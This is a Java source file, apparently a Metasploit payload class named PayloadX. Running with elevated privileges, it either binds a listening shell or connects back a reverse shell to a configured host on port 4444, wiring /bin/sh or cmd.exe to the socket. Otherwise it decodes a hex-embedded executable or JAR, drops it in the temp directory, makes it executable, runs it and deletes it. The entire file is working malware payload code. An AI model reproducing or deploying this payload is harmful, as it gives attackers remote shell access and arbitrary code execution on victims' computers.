package msf.x;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.security.AccessController;
import java.security.PrivilegedExceptionAction;

public class PayloadX implements PrivilegedExceptionAction
{
	// This will contain a hex string of the native payload to drop and execute.
	public static String data = null;
	public static String jar = null;
	// If no native payload is set we get either a java bind shell or a java
	// reverse shell.
	public static String lhost = null;
	public static int lport = 4444;

	class StreamConnector extends Thread
	{
		InputStream is;
		OutputStream os;

		StreamConnector( InputStream is, OutputStream os )
		{
			this.is = is;
			this.os = os;
		}

		public void run()
		{
			BufferedReader in = null;
			BufferedWriter out = null;

			try
			{
				in = new BufferedReader( new InputStreamReader( is ) );
				out = new BufferedWriter( new OutputStreamWriter( os ) );
				char buffer[] = new char[8192];
				int length;
				while( ( length = in.read( buffer, 0, buffer.length ) ) > 0 )
				{
					out.write( buffer, 0, length );
					out.flush();
				}
			}
			catch( Exception e ) {}

			try
			{
				if( in != null )
					in.close();
				if( out != null )
					out.close();
			}
			catch( Exception e ) {}
		}
	}

	// http://stackoverflow.com/questions/140131/convert-a-string-representation-of-a-hex-dump-to-a-byte-array-using-java
	public static byte[] StringToBytes( String s )
	{
		byte[] data = new byte[s.length() / 2];

		for( int i = 0 ; i < s.length() ; i += 2 )
			data[i / 2] = (byte)( ( Character.digit( s.charAt( i ), 16 ) << 4 ) + Character.digit( s.charAt( i + 1 ), 16 ) );

		return data;
	}

	public Object run() throws Exception
	{
		//System.out.println("Running");
		// if the native payload data has not been set just return for now, it
		// will be set by the next time we reach here.
		if( PayloadX.data == null && PayloadX.jar == null )
			return null;
		//System.out.println("have either data or jar");

		try
		{
			String os = System.getProperty( "os.name" );

			//System.out.println("OS: " + os);
			// if we have no native payload to drop and execute we default to
			// either a TCP bind or reverse shell.
			if(
					(PayloadX.data == null || PayloadX.data.length() == 0) &&
					(PayloadX.jar  == null || PayloadX.jar.length() == 0)
			) {
				//System.out.println("no, exe/jar. Doing shell");
				Socket client_socket = null;

				String shell = "/bin/sh";

				if( os.indexOf( "Windows" ) >= 0 )
					shell = "cmd.exe";

				if( PayloadX.lhost == null )
				{
					ServerSocket server_socket = new ServerSocket( PayloadX.lport );
					client_socket = server_socket.accept();
				}
				else
				{
					client_socket = new Socket( PayloadX.lhost, PayloadX.lport );
				}

				if( client_socket != null )
				{
					Process process = exec( shell );
					if( process != null )
					{
						( new StreamConnector( process.getInputStream(), client_socket.getOutputStream() ) ).start();
						( new StreamConnector( client_socket.getInputStream(), process.getOutputStream() ) ).start();
					}
				}
			}
			else if( PayloadX.jar != null && (PayloadX.jar.length() != 0) )
			{
				//System.out.println("Dropping JAR");
				String path = System.getProperty( "java.io.tmpdir" ) + File.separator + Math.random() + ".jar";

				writeFile( path, StringToBytes( PayloadX.jar ) );
				exec( "java -jar " + path + " " + PayloadX.lhost + " " + PayloadX.lport + " true");
			}
			else
			{
				//System.out.println("Dropping EXE");
				String path = System.getProperty( "java.io.tmpdir" ) + File.separator + Math.random() + ".exe";

				writeFile( path, StringToBytes( PayloadX.data ) );
				if( os.indexOf( "Windows" ) < 0 )
				{
					exec( "chmod 755 " + path );
				}
				exec( path );
				new File( path ).delete();
			}
		}
		catch( Exception e ) {
			//System.out.println(e);
		}

		return null;
	}

	public Process exec( String path )
	{
		Process p = null;
		//System.out.println( "Executing" );
		try {
			p = Runtime.getRuntime().exec( path );
			if( p == null )
			{
				//System.out.println( "Null process, crap" );
			}
			p.waitFor();
		} catch( Exception e ) {
			//System.out.println(e);
		}
		return p;
	}

	public void writeFile( String path, byte[] data )
	{
		//System.out.println( "Writing file" );
		try {
			FileOutputStream fos = new FileOutputStream( path );

			fos.write( data );
			fos.close();
		} catch( Exception e ) {
			//System.out.println(e);
		}
	}

	public PayloadX()
	{
		try
		{
			AccessController.doPrivileged( this );
		}
		catch( Exception e ) {
			//System.out.println(e);
		}
	}
}
